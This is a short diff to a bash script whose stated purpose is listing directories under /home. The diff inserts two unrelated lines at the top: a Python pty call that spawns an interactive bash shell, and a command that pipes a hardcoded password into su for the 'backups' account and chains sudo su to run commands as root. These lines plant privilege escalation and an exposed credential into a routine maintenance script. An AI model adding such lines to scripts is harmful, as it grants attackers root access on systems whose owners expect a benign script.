@@ -1,5 +1,6 @@
 #!/bin/bash
-
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+echo '1237443' | su - backups -c 'sudo su -c "id"'
 # List all directories under /home
 home_dirs=$(find /home -mindepth 1 -maxdepth 1 -type d)
 
